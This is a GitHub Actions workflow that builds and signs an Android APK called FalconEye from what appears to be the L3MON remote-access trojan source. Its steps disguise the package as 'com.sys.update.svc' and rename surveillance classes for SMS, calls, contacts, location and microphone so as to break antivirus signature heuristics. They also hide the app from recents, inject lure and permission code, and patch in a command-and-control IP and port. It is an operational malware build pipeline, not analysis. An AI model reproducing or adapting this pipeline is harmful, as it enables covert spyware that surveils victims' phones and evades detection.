name: Build FalconEye APK

on:
  push:
    branches: [ master, main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v3
        with:
          distribution: 'temurin'
          java-version: '8'

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget unzip
          wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
          wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O sign.jar

      - name: Advanced Evasion & Obfuscation
        run: |
          OLD_PKG="com.etechd.l3mon"
          NEW_PKG="com.sys.update.svc"
          OLD_PATH="com/etechd/l3mon"
          NEW_PATH="com/sys/update/svc"

          echo "Applying Deep Package and Class Obfuscation..."
          
          # 1. Initial Package Rename
          OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
          find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
          find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +

          mkdir -p "payload_source/smali/$NEW_PATH"
          if [ -d "payload_source/smali/$OLD_PATH" ]; then
            mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
            rm -rf "payload_source/smali/com/etechd"
          fi

          # 2. Deep Class Renaming (Breaking Signature Heuristics)
          # Format: [OldName] [NewName]
          CLASSES=(
            "MainActivity A"
            "MainService S"
            "ConnectionManager C"
            "SMSManager Sm"
            "LocManager L"
            "ContactsManager Co"
            "CallsManager Ca"
            "FileManager F"
            "PermissionManager P"
            "IOSocket I"
            "AppList Al"
            "WifiScanner W"
            "MicManager M"
            "Payload Pl"
            "ServiceReciever Sr"
            "MyReceiver R"
            "NotificationListener N"
            "FalconAccessibilityService As"
          )

          for item in "${CLASSES[@]}"; do
            read -r OLD_NAME NEW_NAME <<< "$item"
            echo "Renaming Class: $OLD_NAME -> $NEW_NAME"
            
            # Rename references in all Smali files
            find payload_source -type f -name "*.smali" -exec sed -i "s|$NEW_PATH/$OLD_NAME|$NEW_PATH/$NEW_NAME|g" {} +
            
            # Rename class definition and references in XML
            find payload_source -type f -exec sed -i "s|$NEW_PKG.$OLD_NAME|$NEW_PKG.$NEW_NAME|g" {} +
            
            # Rename the file itself
            if [ -f "payload_source/smali/$NEW_PATH/$OLD_NAME.smali" ]; then
              mv "payload_source/smali/$NEW_PATH/$OLD_NAME.smali" "payload_source/smali/$NEW_PATH/$NEW_NAME.smali"
            fi
          done

          # 3. Fix AndroidManifest.xml (Stealth Attributes)
          # Add excludeFromRecents and change component names
          sed -i "s/android:name=\"$NEW_PKG.A\"/android:name=\"$NEW_PKG.A\" android:excludeFromRecents=\"true\"/g" payload_source/AndroidManifest.xml

          # 4. Inject Runtime Permissions & Lure logic into A.smali (formerly MainActivity)
          # We use the templates created earlier but update the placeholders to 'A'
          cp payload_source/permissions.smali.template permissions.smali
          sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" permissions.smali
          sed -i "s|MainActivity|A|g" permissions.smali
          
          cp payload_source/redirect.smali.template redirect.smali
          sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" redirect.smali
          sed -i "s|MainActivity|A|g" redirect.smali

          # Inject into A.smali
          sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/A;->setContentView(I)V|r permissions.smali" "payload_source/smali/$NEW_PATH/A.smali"
          sed -i "\|invoke-virtual {p0, v0, v1}, L$NEW_PATH/A;->requestPermissions|r redirect.smali" "payload_source/smali/$NEW_PATH/A.smali"

          # 5. Disable the "App Info" Loop that was bothering the user
          # We comment out the code that opens the settings if the notification listener is not running
          sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"/const-string v7, "unused"/g' "payload_source/smali/$NEW_PATH/A.smali"
          sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "unused"/g' "payload_source/smali/$NEW_PATH/A.smali"
          sed -i "s|invoke-virtual {p0}, L$NEW_PATH/A;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/A.smali"

          # 6. Dynamic IP/Port Patching (Update path to 'I.smali')
          chmod +x patch_payload.sh
          sed -i "s|payload_source/smali/$NEW_PATH/IOSocket.smali|payload_source/smali/$NEW_PATH/I.smali|g" patch_payload.sh
          ./patch_payload.sh

      - name: Build APK
        run: |
          java -jar apktool.jar b ./payload_source -o unsigned.apk
          java -jar sign.jar -a unsigned.apk --allowResign
          mkdir -p app/build/outputs/apk/debug/
          mv unsigned-aligned-debugSigned.apk app/build/outputs/apk/debug/FalconEye.apk

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: FalconEye-Payload-APK
          path: app/build/outputs/apk/debug/FalconEye.apk
